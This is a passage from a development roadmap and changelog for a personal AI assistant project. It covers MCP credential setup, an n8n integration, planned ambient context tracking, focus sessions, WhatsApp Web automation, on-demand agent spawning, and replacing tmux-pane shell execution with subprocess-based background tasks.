      `configure_mcp_server(name, credential)` writes the right env var
      into `~/.hi/.env` (creating it if needed), gated by the same
      `confirm_destructive()` as everything else that touches disk
      outside the vault. Both wired into `butler`'s tool list. **A real
      correctness bug found and fixed while building this, not after**:
      `hi/mcp_tools.py`'s `_server_configs()` did `from hi.config import
      GITHUB_PERSONAL_ACCESS_TOKEN, OBSIDIAN_REST_API_KEY` — a
      `from`-import snapshots the value at module-import time, so a
      freshly-written credential would have been silently invisible for
      the rest of the process no matter what `configure_mcp_server()`
      did. Fixed by switching to `import hi.config as config` and
      reading `config.GITHUB_PERSONAL_ACCESS_TOKEN` fresh at call time.
      Scope is deliberately narrower than "any MCP server by name" (see
      the module's own docstring) — there's no generic arbitrary-server
      support to browse, only the three this project already knows how
      to build; documented as a real limitation, not silently narrowed.
      Also flagged, not hidden: a credential takes effect for the NEXT
      agent built with MCP tools in scope this session (or the next
      restart), not retroactively for an agent already sitting in
      `hi/repl.py`'s `agent_cache` — tools are bound at construction
      time. Live-verified against a scratch `.env` path (never the real
      one): write + in-memory `config` update + `mcp_tools` cache-bust
      all confirmed correct, plus the unknown-server, no-credential-
      needed (playwright), and user-declined paths.
- [x] MCP-UI widget recall — new `hi/widget_store.py`: `save_widget()`
      persists every widget `agui_adapter.py` detects to
      `hi/knowledge/widgets/<slug-of-uri>.md` (deduped by uri, so a
      widget re-served later overwrites its own file rather than piling
      up); `recall_widget(query)` (wired into `docs`) returns it in the
      exact shape `_mcp_ui_widget()` already detects, so recall reuses
      the existing CUSTOM-event passthrough rather than a second
      rendering path — an empty/vague query ("that again") returns the
      most recent; a specific one matches against saved uris. **Still
      genuinely unverified against a real MCP-UI server**, same honest
      caveat as Phase 18 itself — tested only against synthetic
      widget content shaped like the real spec: save/overwrite-by-uri/
      vague-recall/keyword-recall/no-match all confirmed correct, and
      the recalled dict was fed back through the real `_mcp_ui_widget()`
      detector (both as a bare dict and wrapped in a list) to confirm it
      round-trips exactly like a live tool result would.

_All three were picked up this session after all — Phase 20 is now
fully complete, no remaining deferrals._

_Ref: `BLOCKERS.md` → "More features" 1-8 — listed there as extras
layered on top of Phase 16's substrate, explicitly not a strict
sequential phase._

---

## Phases 21–27 — Ambient Jarvis: proactive, always-has-context, focus-aware (per explicit request)

A single large ask, broken into buildable pieces rather than attempted at
once: continuous ambient watching (dev folder/vault/browser) with live
on-screen suggestions, preset + custom automations (flagship example: an
uploaded exam timetable → a study plan → proactively found/downloaded
study content from WhatsApp groups), distraction management during an
explicit focus session, on-demand agent spawning, a context/caching
layer so `hi` always knows what you were doing and need to be doing, and
focus tooling (Pomodoro) the AI itself can toggle. Scoped via three
explicit decisions before any of it was built: WhatsApp access goes
through Playwright-driven WhatsApp Web automation (accepted risk: no
official API, fragile against UI changes, likely against WhatsApp's ToS
for automated access — flagged, not silently built); "close anything
distracting" only acts without per-action confirmation inside an
explicitly-started focus session, never ambiently; the live on-screen
surface is a floating HUD overlay, a genuinely new UI surface, not a
notification or a menu-bar dropdown.

### Phase 21 — Context & caching layer (build first — 22–27 all read/write through this)

- [ ] A single rolling context store (`~/.hi/context_state.json`, same
      shape as `context_shift_state.json`/`suggest_state.json`'s own
      precedent): recent significant events (file edits, vault notes
      touched, browser pages visited, focus-session state, conversation
      topic) with timestamps, capped/pruned so it stays small
- [ ] `record_event(kind, detail)` — a cheap, synchronous append, called
      by Phase 22's watchdogs and any tool that already knows something
      context-worthy just happened (e.g. `create_note`, `open_url_in_browser`)
- [ ] `get_current_context() -> dict` (raw recent-events read) and
      `summarize_context() -> str` (a fast-tier — reasoning off, same
      `fast_variant()`/`get_tier_model_fast()` pattern this session
      already used for memory_graph.py/vault_rag.py/spoken_summary.py —
      one-line "what you're probably doing right now" synthesis)
- [ ] A new persona tool (`get_current_context`, available to all four)
      so "what was I doing" / "what do I need to do" gets answered from
      real tracked state, not guessed from the current conversation alone
- [ ] `GET /context` on the voice daemon, for Phase 23's HUD to poll
- [ ] File/preference caching: avoid redundant vault reads for content
      that hasn't changed since last read (mtime-keyed, in-process —
      not a new database, matching this project's "filesystem is the
      source of truth" stance)

### Phase 22 — Ambient watchdogs: dev folder, vault, browser (build after 21)

- [ ] Dev-folder watcher: extend `hi/watchdogs/` with a filesystem-event
      watcher (polling mtime, same zero-new-dependency approach
      `context_shift.py`/`idle_repos.py` already use — not `watchdog`/
      `fswatch` unless polling proves too coarse) over the active dev
      project (same directory `dev_servers.py`/`idle_repos.py` already
      know how to find), feeding `record_event("dev_file_changed", ...)`
- [ ] Vault watcher: same shape, over `VAULT_PATH` — feeds
      `record_event("vault_note_changed", ...)`
- [ ] Playwright browser watcher: reuse whatever Playwright MCP/session
      this project already drives for `web`/browser tools — watch active
      page/tab changes, feed `record_event("browser_page_changed", ...)`
      (title + URL only, not page content, matching this project's
      existing "state-change only, never content" privacy posture from
      `context_shift.py`)
- [ ] Wire all three into `hi --suggest-daemon`'s existing gated
      suggestion pipeline (`hi/suggest/engine.py`) rather than a
      parallel notification path — same confidence-gate/per-day-dedup
      discipline already established there

### Phase 23 — Floating HUD overlay (build after 21, benefits from 22)

- [ ] A new always-on-top, borderless SwiftUI window (distinct from the
      Spotlight quick-panel and the main chat window) showing live
      context (`GET /context`) and any pending suggestion, polling or
      SSE-subscribed to the voice daemon
- [ ] Dismiss/snooze/pin controls — this is ambient, not a modal; must
      never block interaction with whatever's underneath it
- [ ] A settings toggle to turn the HUD off entirely — this is a much
      more visible, opinionated UI surface than anything shipped so far,
      and needs an easy off switch from day one

### Phase 24 — Focus sessions: Pomodoro + gated distraction control (build after 21; 22/23 optional)

- [ ] `start_focus_session(goal, duration_minutes)` / `end_focus_session()`
      tools — persisted focus-session state (context layer, Phase 21),
      not just an in-memory timer, so it survives a daemon restart
- [ ] A real Pomodoro timer tool the AI can start/stop/query on request
      ("start a pomodoro"), notifying (macOS notification, reusing
      whatever `mac_control.py` already has) at each interval boundary
- [ ] Auto-close-distracting-apps **only while a focus session is
      active** (the explicit scope decision above) — a configurable
      distraction list, `quit_app`/window-management tools already in
      `mac_control.py` reused, not rebuilt; never fires ambiently
      outside an active session
- [ ] "Continue?" nudge at session end instead of silently stopping —
      re-offers the same session rather than assuming the user is done

### Phase 25 — Custom automation framework (build after 21; the exam-timetable flagship lives here)

- [ ] A trigger → pipeline model: preset automations (ship a few, e.g.
      "uploaded file matching a timetable/schedule shape → generate a
      study plan") plus user-defined ones (a plain description of
      trigger + steps, stored as a vault-backed automation definition —
      "filesystem is the source of truth" again, not a hidden config)
- [ ] Flagship example, built and live-tested end to end: upload an exam
      timetable → parse it → produce a real study plan (dated, per
      subject) → proactively surface study content for the nearest
      exam (Phase 26 for WhatsApp-sourced content specifically)
- [ ] Automations run through the existing orchestrator (Phase 16-20
      infrastructure), not a new execution engine — a multi-step
      pipeline is exactly what `run_orchestrated()` already does

### Phase 26 — WhatsApp Web automation (build after 25, or standalone)

- [ ] Playwright-driven WhatsApp Web session: search groups by name/
      content, identify and download shared files/links matching a
      query (e.g. "study material for [subject]")
- [ ] **Explicit, standing caveat, not hidden**: no official API, so
      this is inherently fragile against WhatsApp Web UI changes and is
      likely outside WhatsApp's ToS for automated bulk access — accepted
      per explicit direction, but any failure mode here should fail
      loudly (tell the user it broke) rather than silently return
      nothing
- [ ] Session/auth handling: WhatsApp Web needs an authenticated,
      already-logged-in browser session — reuse a persistent Playwright
      profile rather than re-scanning a QR code every run

### Phase 27 — On-demand dynamic agent spawning (build after 16-20; independent of 21-26)

- [x] A user-facing "create an agent for X" capability — confirmed the
      hunch: mostly already possible via the existing orchestrator/
      subagent infrastructure. New `hi/agents_ondemand.py` builds one
      scoped agent per request via `hi/orchestrator/subagent.py`'s
      already-existing `build_subagent()`, routed to a persona via
      `hi/router.py`'s `classify()` — no new execution mechanism, only
      a new entry point plus a lifecycle wrapper around it
      (`clarifying -> ready -> running -> done|error`), in-memory
      runtime state (same `threading.Lock` + dict pattern
      `pending_actions.py` already established) with a durable
      Markdown record written to `hi/knowledge/agents/<id>.md` once a
      run finishes — "filesystem is the source of truth" for the
      history, not the live coordination state
- [x] **Clarification before execution, per explicit request**: "before
      it finalizes and starts implementing it should ask me questions
      to clarify the instructions." `_generate_clarifying_questions()`
      (reasoning off, `get_tier_model_fast()` — the same latency class
      this session already fixed for memory_graph.py/vault_rag.py's own
      judgment calls) decides whether a task is genuinely ambiguous and
      asks up to 3 short questions if so, or proceeds straight to
      execution if not. Bounded at `MAX_CLARIFICATION_ROUNDS = 2` so it
      can't ask forever. Live-verified both paths: a genuinely ambiguous
      prompt ("help me prepare for my exam") correctly generated 3 real
      questions (subject/timeline/format) in 2.6s; after answering, it
      correctly judged no further clarification was needed and produced
      a real, coherent, clarification-aware study plan (classified to
      `web`, correctly incorporating "trees and graphs" from the
      answers) — result and vault-persisted record both inspected
      directly, not just checked for absence of an error
- [x] Presets for the frontend's "one-click" agents — `PRESETS` (daily
      summary / uncommitted git changes / upcoming deadlines), already
      well-specified by definition so they skip clarification entirely
      and go straight to running. Live-verified: a preset run correctly
      skipped to `status: "running"` immediately and finished with a
      real, correct answer via `butler` (checked the user's actual
      TODO list, found nothing overdue, said so plainly)
- [x] `POST /agents` (prompt or preset), `POST /agents/{id}/answer`,
      `GET /agents` / `GET /agents/{id}` / `GET /agents/presets`
      (`hi/ipc/server.py`) — polled, not streamed; a background thread
      per run, same "check back on this later" shape
      `PendingActionsMonitor.swift` already established for other
      long-running backend work, not a second SSE surface
- [x] **Visualize + one-click spawn in the Vue frontend, per explicit
      request**: new `AgentTasksView.vue` (a new `agents` nav entry in
      `App.vue`, deliberately separate from the pre-existing
      `AgentsColumn.vue`, which shows the four fixed personas' live
      status and pending approvals — a different concept from spawned
      on-demand agents) — one-click preset buttons, a free-form task
      composer, and a live-polled (3s) list of every run showing
      status, with an expandable clarification Q&A form when a run is
      waiting on the user and the rendered Markdown result once done.
      `vue-tsc -b` and `npm run build` both clean; dev server serves
      the new route (curl-verified, no browser tool in this
      environment — same standing limitation as every other UI change
      this project has made)
- [ ] Decide persistence beyond one-shot: a *standing* agent (keeps
      running, e.g. as a new watchdog) is real future scope this
      session's own request didn't ask for ("I can give them tasks and
      it will do that" reads as one-shot: given a task, do it, report
      back) — left undone rather than guessed at; every run built here
      is one-shot (runs, reports, persists, exits)
- [x] **n8n added as a new MCP server, following the existing Obsidian
      pattern exactly** (per explicit request): `hi/config.py` gained
      `N8N_MCP_URL`/`N8N_MCP_TOKEN`; `hi/mcp_tools.py`'s
      `_server_configs()` adds an "n8n" entry (`streamable_http`,
      bearer-token header) once both are set — the same transport shape
      Obsidian already uses, n8n's own config just calls it `"type":
      "http"`. Needs two values, not Obsidian's one credential (its own
      instance URL, since it's self-hosted and varies per user, plus a
      token) — `hi/mcp_install.py`'s `_CATALOG` widened to accept a
      tuple of env vars for exactly this case, and a dedicated
      `configure_n8n_server(url, token)` tool (not forced through the
      single-credential `configure_mcp_server()`) added alongside it,
      confirm-gated the same way. Wired into `butler`'s `TOOLS`. **Live-
      verified against the user's real, already-configured self-hosted
      instance** (not just import-checked): `get_mcp_tools()` connected
      and returned 35 real n8n tools (`search_workflows`,
      `execute_workflow`, `create_workflow_from_code`, `validate_workflow`, ...)
      alongside the existing playwright/github/obsidian tools.
- [x] **MCP servers surfaced in the Agents view, and on-demand agents
      can be assigned one server's tools directly, per explicit
      follow-up request** ("update the agents view to house this mcp
      part. I want to create agents that can communicate with the mcp I
      assign"). Backend: `hi/mcp_tools.py`'s `get_mcp_tools()` refactored
      (no new connections, same single fetch) to also expose
      `get_mcp_tools_by_server()` — the same live-fetched tools grouped
      by which server they came from. `hi/orchestrator/subagent.py`'s
      `build_subagent()` gained `extra_tools`/`extra_prompt` (additive,
      not a replacement for the persona's own tools/prompt) so an
      on-demand agent can be hard-assigned exactly one server's tools.
      `hi/agents_ondemand.py`'s `create_run()`/`AgentRun` gained
      `mcp_server` — checked eagerly against `get_mcp_tools_by_server()`
      (an unreachable/misconfigured assignment fails the run immediately,
      not silently), and the clarification step is told an MCP server is
      already assigned so it doesn't waste a round asking which
      instance/credentials to use for it (a real UX bug caught and fixed
      live: it initially asked "which n8n instance" and "do you have a
      token" despite the connection already being live). New endpoints:
      `GET /mcp/servers` (catalog + credential status — the write-only
      analog of `/config`, which deliberately excludes MCP credentials
      from ever being echoed back), `POST /mcp/configure` /
      `POST /mcp/configure/n8n` (direct writes, no `confirm_destructive()`
      gate — a human filling in a form and clicking Save *is* the
      confirmation, same reasoning `/config` itself already established),
      `GET /agents/mcp-servers` (only servers actually connected right
      now, with real tool counts — the real, pickable choices for
      assignment). Frontend: `AgentTasksView.vue` gained a collapsible
      MCP-servers panel (status, inline configure forms — a single
      credential field for github/obsidian, url+token for n8n) and an
      "assign an MCP server to the next agent" dropdown feeding
      `createAgentRun()`'s new `mcpServer` option; a run card shows its
      assigned server as a small badge. `vue-tsc -b` and `npm run build`
      both clean. **Live-verified end to end against the real n8n
      instance, not a mock**: assigning "n8n" and asking "list my n8n
      workflows and tell me how many there are" correctly called the
      real `search_workflows` tool and reported the actual answer (1
      workflow, "MLSA") through the full HTTP path — create → poll →
      done, not just the underlying function in isolation.

### Phase 28 — Remove the tmux-pane dependency from `term`'s shell tools entirely (per explicit request)

Reported live: `"No sibling pane found to run commands in — term needs
the standard two-pane hi layout (left pane = your shell)."` Root cause
found by reading `shell_pane.py`'s own `_own_pane_id()`/`left_pane_id()`:
`term.py`'s `_HAS_TMUX_PANE` gate only checked `TMUX_PANE` being *set*
(true for any process running inside *some* tmux pane, including the
voice daemon's own if it happened to be launched from one) — not
whether a genuine *sibling* `hi --term` pane actually existed next to
it. Explicit follow-up direction, not just a bug fix: "Completely phase
out any functions handled by the terminal based aspect and have
everything handled only by the frontend... spawn terminal instances as
separate task and assign agents instead of relying on the left pane...
I want to see the terminal function similar to the code agent
functionality like in the parent project sage."

- [x] `run_shell_command` rewritten to a plain `subprocess.run()` —
      no tmux pane, no marker-polling, no dependency on a specific
      launch layout. Works identically from the terminal REPL, the
      voice companion, the web frontend, or an on-demand agent. Kept:
      the destructive-command confirm gate (`looks_destructive` +
      `review_shell_command` + `confirm_destructive`), unchanged.
      Dropped: Ctrl-J mid-wait interruption (no longer meaningful —
      short commands run under a bounded timeout, long ones are
      redirected before any wait begins) and the pager-disabling env
      prefix (`subprocess.run` doesn't inherit an interactive TTY a
      pager would try to page against, so `git diff` etc. don't hang
      the way they could in a real pty).
- [x] Long-running commands (dev servers, watchers — the same
      `looks_long_running` heuristic as before) no longer redirect into
      a brand-new tmux pane (`tmux_control.py`'s `add_pane`, now
      deleted). New `hi/agents/term/background_tasks.py`: a plain
      `subprocess.Popen` tracked in an in-memory registry (same
      `threading.Lock` + dict shape `pending_actions.py` already
      established), with a reader thread live-tailing combined
      stdout/stderr into a bounded buffer. Three new tools
      (`list_background_tasks`/`check_background_task`/
      `stop_background_task`) let the model check on/stop one
      conversationally; `GET /background`, `GET /background/{id}`,
      `POST /background/{id}/stop` (`hi/ipc/server.py`) let the
      frontend do the same directly. This *is* "spawn terminal
      instances as separate task... instead of relying on the left
      pane" — a dev server is now a trackable task object, not a pane
      you have to keep open and looking at.
- [x] `_HAS_TMUX_PANE`/`_TMUX_ONLY_TOOLS` gating removed from
      `term.py` entirely — `run_shell_command` and the background-task
      tools are unconditionally in `TOOLS` now, since none of them
      need tmux for anything anymore. `hi/agents/term/shell_pane.py`
      and `hi/agents/term/tmux_control.py` deleted outright (confirmed
      unreferenced anywhere else first) rather than left as dead code.
      `hi/agents/term/dev_flow_tool.py`'s *own*, separate, explicitly
      opt-in tmux-workspace launcher (`open_dev_flow`/`add_dev_flow` —
      "open my saved project workspace, apps + a two-pane layout") is
      untouched — a deliberate, different feature from "run one shell
      command and get its output back," not part of what was reported
      broken or asked to be phased out.
- [x] `term_prompt.md` rewritten to match: no more "only available
      inside a real tmux pane" caveat, `add_pane`'s docs replaced with
      the three background-task tools' own.
- [x] **"See the terminal function similar to the code agent
      functionality like in sage"**: the web frontend's existing live
      tool-call trace (`TraceSegmentView.vue` — name/args/result, one
      card per call, already built for every tool `term` has) already
      gives a regular `run_shell_command` call this exact experience;
      what was missing was specifically for work that outlives one
      streamed turn — a background task's own card in the Agents view
      (live-polled output, a stop button) is the equivalent for that
      case, the same "watch it work, not just get a final answer"
      principle applied to the piece that doesn't fit inside a single
      request/response.
- [x] **Live-verified against the exact reported failure, not just
      reasoned about**: reproduced the original trigger (a real shell
      with `TMUX_PANE` set, driving the voice daemon) — before the fix
      this exact setup is what raised the reported error; after,
      `run_shell_command('echo hello from subprocess && pwd')` through
      the real running daemon returned correct real output. A
      long-running command (`tail -f ...`) correctly started as a
      background task, showed up in `GET /background` with a real PID
      and live-tailed output, and `POST /background/{id}/stop`
      correctly transitioned it to `exited`. A genuinely failing
      long-running command (`npm run dev` from a directory with no
      `package.json`) correctly captured and reported the real npm
      error text, not a swallowed failure.
- [x] Full-package import smoke test (80 modules) and `py_compile`
      clean after the rewrite; `vue-tsc -b`/`npm run build` clean for
      the new frontend section.

## Suggested order

**6 → 7 → 8 → 9** is the backbone: 6 is a cheap config change worth doing
immediately regardless of what comes after; 7 unblocks both 8 and 13
directly; 9 is independent of 7/8 but is the deepest, most valuable
single piece of work in the numbered blockers, so don't let it get
crowded out by flashier items below it. **10 before 11** — barge-in in
11 needs 10's cancellation primitive to exist first, and 11 itself is
much more pleasant to use once 6's latency fix already landed. **12, 14,
15 are independent of everything else** and of each other — pick based
on what's actually most wanted day to day, not a forced order. **13
waits on 7.** None of Phases 6–15 block one another _except_ where
stated above — this isn't one long dependency chain, most of it can be
picked up in any order once its stated prerequisite (if any) is done.

**Phases 16–20 are a separate initiative** (multi-agent orchestration),
independent of Phases 6–15 — they build on the current state of
`hi/router.py`/`hi/personas.py`/`hi/action_tiers.py`, not on any specific
one of 6–15 having landed first. Within 16–20, the order is strict where
`BLOCKERS.md` says so and nowhere else: **16 first, always** — 17, 18,
and 19 all build directly on Phase 16's DAG executor and don't work
without it. **17 and 18 are independent of each other** (one's the
approval-queue rework, the other's the streaming-protocol rework) — pick
either first. **19 wants 16, 17, and 18 all landed** (its DAG status
line and trace replay assume both the executor and the richer event
stream exist). **20's eight items are each independent extras**, pick
up in any order once 16 exists — several of them (approvals-as-UI,
reviewer-verifies-coder) additionally reference 17/18's own output but
aren't blocked on 19.

**Phases 21–27 are a third, separate initiative** (ambient/proactive
Jarvis), independent of 6–20 except that 27 wants 16–20's orchestrator
already landed (it is). **21 first, always** — every other phase in this
group reads or writes the context/caching layer it builds. After 21:
**22 and 23 are independent of each other** (watchdogs vs. the HUD
surface), pick either first — 23 is more useful with 22 already feeding
it real events, but doesn't strictly require it. **24 only needs 21.**
**25 only needs 21**; **26 is genuinely standalone** (WhatsApp
automation doesn't need the automation framework to exist first, though
25's flagship example is the reason to build it) — pick 25 or 26 first
based on which is more useful sooner. **27 is fully independent of
21–26**, blocked only on 16–20 (already done).
